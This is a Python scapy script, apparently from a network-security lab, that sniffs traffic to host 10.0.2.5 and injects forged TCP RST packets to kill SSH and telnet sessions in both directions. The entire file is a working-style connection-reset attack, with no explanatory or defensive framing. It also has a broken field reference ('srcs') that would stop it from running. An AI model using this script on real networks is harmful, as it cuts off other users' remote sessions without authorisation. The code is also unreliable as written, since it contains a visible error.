#!/usr/bin/python3
from scapy.all import *
IGNORE_MAC = "08:00:27:46:8a:e7"
def send_reset(src_ip, dst_ip, sport, dport, seq, ack):
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq, ack=ack)
    pkt = ip / tcp
    send(pkt, verbose=0)
def sniff_packet(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        src_ip = pkt[IP].srcs
        dst_ip = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        seq = pkt[TCP].seq
        ack = pkt[TCP].ack
        # Ensure correct sequence number handling
        payload_len = len(pkt[TCP].payload) if pkt[TCP].payload else 0
        # SYN or FIN packets should always increment sequence number by 1
        if "S" in pkt[TCP].flags or "F" in pkt[TCP].flags:
            seq += 1  # SYN/FIN contribute 1 to the sequence number
        if dport in [22, 23]:  # Client -> Server
            send_reset(dst_ip, src_ip, dport, sport, ack, seq + payload_len)
        elif sport in [22, 23]:  # Server -> Client
            send_reset(dst_ip, src_ip, dport, sport, ack, seq + payload_len)
my_filter = "tcp and host 10.0.2.5 and not ether src " + IGNORE_MAC
sniff(filter=my_filter, prn=sniff_packet)